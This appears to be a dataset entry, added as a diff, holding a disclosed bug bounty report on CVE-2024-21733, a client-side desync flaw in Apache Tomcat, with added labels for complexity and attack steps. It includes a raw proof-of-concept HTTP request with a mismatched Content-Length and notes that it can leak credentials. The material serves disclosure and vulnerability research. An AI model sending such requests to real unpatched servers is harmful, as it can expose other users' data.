@@ -1,0 +1,38 @@
+{
+  "reported_to": "Internet Bug Bounty",
+  "reported_by": "xer0dayz ",
+  "title": "CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444)",
+  "content": "\nApache Tomcat from 8.5.7 through 8.5.63, from 9.0.0-M11 through 9.0.43 are vulnerable to client-side de-sync attacks.\nClient-side de-sync (CSD) vulnerabilities occur when a web server fails to correctly process the Content-Length of POST requests. By exploiting this behavior, an attacker can force a victim's browser to de-synchronize its connection with the website, causing sensitive data to be smuggled from the server and/or client connections.\nUsers are recommended to upgrade to version 8.5.64 onwards or 9.0.44 onwards, which contain a fix for the issue.\nPoC:\nCode 699 Bytes\n1POST / HTTP/1.1\n2Host: hostname\n3Sec-Ch-Ua: \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"\n4Sec-Ch-Ua-Mobile: ?0\n5Sec-Ch-Ua-Platform: \"Linux\"\n6Upgrade-Insecure-Requests: 1\n7User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36\n8Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n9Sec-Fetch-Site: none\n10Sec-Fetch-Mode: navigate\n11Sec-Fetch-User: ?1\n12Sec-Fetch-Dest: document\n13Accept-Encoding: gzip, deflate, br\n14Accept-Language: en-US,en;q=0.9\n15Priority: u=0, i\n16Connection: keep-alive\n17Content-Length: 6\n18Content-Type: application/x-www-form-urlencoded\n19\n20X\nIn some cases, this can leak sensitive data such as clear-text credentials (see attached screenshot).\nCredit:\nThis vulnerability was reported responsibly to the Tomcat security team by xer0dayz from Sn1perSecurity LLC.\nHistory:\n2024-01-19 Original advisory\nReferences:\n[3] https://tomcat.apache.org/security-9.html\n[4] https://tomcat.apache.org/security-8.html\nImpact\nAn attacker can force a victim's browser to de-synchronize its connection with the website, causing sensitive data to be smuggled from the server and/or client connections.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": 4660,
+  "weaknesses": [
+    "HTTP Request Smuggling"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1706579220,
+  "report_url": "https://hackerone.com/reports/2327341",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a specially crafted HTTP POST request to the vulnerable Apache Tomcat server with a mismatched Content-Length header."
+    ],
+    [
+      2,
+      "Observe the server's response to confirm if the request smuggling was successful, potentially leaking sensitive data."
+    ]
+  ],
+  "vuln_description": "Apache Tomcat is vulnerable to client-side de-sync (CSD) attacks where an attacker can force a victim's browser to de-synchronize its connection with the website by exploiting incorrect processing of the Content-Length header in POST requests. This can lead to sensitive data being smuggled from the server or client connections.",
+  "reason": "The vulnerability involves understanding HTTP request smuggling techniques and the specific behavior of Tomcat's Content-Length header processing. While the attack requires crafting a specific HTTP request, the components involved (HTTP headers and server response) are straightforward and well-documented.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
